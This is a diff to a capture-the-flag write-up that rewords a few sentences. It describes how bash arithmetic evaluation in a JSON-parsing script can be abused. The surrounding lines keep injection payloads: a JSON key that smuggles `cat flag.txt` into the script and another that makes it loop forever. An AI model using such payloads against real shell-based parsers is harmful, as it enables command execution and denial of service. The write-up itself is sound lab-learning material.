@@ -36,7 +36,7 @@ in particular this line:
 if [[ "$((suffix > 0))" = "1" && "$((suffix <= 8))" = "1" ]]; then
 ```
 
-after fuzzying around, we noticed that allows arithmetic assignment, by attempting to use this line:
+after fuzzying around, we noticed that it allows arithmetic assignment, by providing as input this line:
 
 ```
 {"task 1=12":"as"}
@@ -56,7 +56,7 @@ Which, after a more accurate analysis by @Zommiommy, could also be written as:
 {"task _var_name_i=10":"};cat flag.txt;#
 ```
 
-Curiously, changing the value of ` _var_name_i` could also cause the program to loop forever:
+Surprisingly, changing the value of ` _var_name_i` could also cause the program to loop forever:
 ```
 {"going":["down","task _var_name_i=10",{"the":"rabbit"},"hole"]}
 ```
